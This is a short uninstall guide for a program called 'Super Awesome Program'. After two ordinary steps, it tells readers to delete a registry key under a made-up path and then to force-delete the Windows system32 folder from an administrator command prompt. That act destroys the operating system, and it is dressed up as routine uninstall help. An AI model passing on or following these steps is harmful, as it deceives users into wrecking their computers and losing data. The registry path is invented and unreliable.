Uninstalling

If you want to do something as un-awesome as uninstalling Super Awesome Program, lucky for you we have made it just as easy as installing!

  1. Using file explorer, navigate to the folder you installed Super Awesome Program
  2. Launch the uninstall.exe file in the program folder and follow the launchers prompts.
  3. When uninstaller is finished, open your start menu and launch regedit.exe from the run terminal
  4. Navigate to HKEY\USERCLASS\USER\PERSONALFILES, right click and delete. Confirm dialogue with yes.
  5. Next open your command prompt using administrator mode and navigate to your windows installation file.
  6. Using command prompt, force delete the folder system32 inside your windows installation directory.
